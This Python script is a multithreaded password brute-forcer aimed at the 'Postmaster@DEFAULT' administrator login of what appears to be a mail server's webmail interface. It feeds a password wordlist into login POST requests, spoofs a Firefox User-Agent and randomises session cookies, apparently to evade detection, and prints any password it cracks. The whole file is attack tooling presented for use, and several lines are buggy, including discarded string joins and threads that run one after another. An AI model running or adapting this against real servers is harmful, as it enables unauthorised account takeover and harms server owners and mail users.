import argparse
import random
import string
from urllib import request, parse
import threading
import queue
import json
import os

resume_word = None
passwords = queue.Queue()


class Brute:

    def __init__(self):
        self.txtUsername = "Postmaster@DEFAULT"
        self.txtPassword = ""
        self.host = args.set_host
        self.User_Agent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
        self.url = "/Mondo/Servlet/request.aspx?Cmd=LOGIN&Format=JSON&ts="
        self.Referer = "http://<ip>/Mondo/lang/sys/login.aspx"
        self.Content_Type = "application/x-www-form-urlencoded"
        self.found = False

    def Brutus(self):

        while not passwords.empty() and not self.found:

            if args.randomize:
                ASP_NET_SessionID = randomize(24, "alphanum")
                NSC_NbjmFobcmf_XfcNbjm = randomize(44, "alphanum")
                self.url.join(randomize(13, "num"))
            else:
                ASP_NET_SessionID = "3qk4w045mgqxsqmea0e1uo45"
                NSC_NbjmFobcmf_XfcNbjm = "ffffffff5e51fc5245525d5f4f58455e445a4a423660"
                self.url.join("1556521015066")

            self.txtPassword = passwords.get()

            cookies = "ASP.NET_SessionId':" + ASP_NET_SessionID + " , 'NSC_NbjmFobcmf_XfcNbjm':" + NSC_NbjmFobcmf_XfcNbjm

            data = parse.urlencode(
                {'txtUsername': self.txtUsername, 'txtPassword': self.txtPassword, 'txtKey': '', 'ddlLanguages': 'en',
                 'ddlSkins': 'Arctic', 'loginParam': 'SubmitLogin', 'offset': '-330'})
            headers = {'host': self.host, 'User-Agent': self.User_Agent, 'Referer': self.Referer,
                       'Content-Type': self.Content_Type, 'Cookie': cookies}
            try:

                req = request.Request("http://" + self.host + self.url, data=data.encode('utf-8'), method='POST',
                                      headers=headers)
                res = request.urlopen(req)
                result = json.loads(res.read().decode('utf-8'))

                if result['AuthenticationResult'] == 1:
                    self.found = True
                    print(
                        "--------------------------Bruteforce Success---------------------------\nUsername:" + self.txtUsername + "\nPassword:" + self.txtPassword)
                    os._exit(0)

                elif not args.quite:
                    print("Failed login: " + self.txtUsername + "/" + self.txtPassword)


            except Exception as err:
                print(str(err))
                pass

    def start(self):
        print("Starting with " + str(args.set_threads) + " threads")
        for x in range(int(args.set_threads)):
            thread = threading.Thread(target=self.Brutus())
            thread.start()


def randomize(length, type):
    if "num".__eq__(type):
        return ''.join(random.choice(string.digits) for x in range(length))
    elif "alphanum".__eq__(type):
        sampleset = string.ascii_lowercase + string.digits
        return ''.join(random.choice(sampleset) for x in range(length))


def build_queue(password_file):
    fd = open(password_file, "rb")
    pass_list = fd.readlines()
    fd.close()
    if len(pass_list):
        if not resume_word:
            for passwd in pass_list:
                passwd = passwd.decode("utf-8").rstrip()
                passwords.put(passwd)
        else:
            resume_found = False
            for passwd in pass_list:
                passwd = passwd.decode("utf-8").rstrip()
                if passwd == resume_word:
                    resume_found = True
                    passwords.put(passwd)
                else:
                    if resume_found:
                        passwords.put(passwd)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--set_threads', '-st', help="Number of threads.", type=int, default=1)
    parser.add_argument('--set_host', '-sh', type=str, help="host ip.", default="localhost")
    parser.add_argument('--randomize', '-r', type=bool, help="randomizes all params.(True/False)", default=True)
    parser.add_argument('--pass_file', '-pf', type=str, help="password file", default="password.txt")
    parser.add_argument('--quite', '-q', type=bool, help="verbosity(True/False)", default=False)
    args = parser.parse_args()
    build_queue(args.pass_file)
    test = Brute()
    test.start()
    print("Password not in list. Bruteforce unsuccessful")
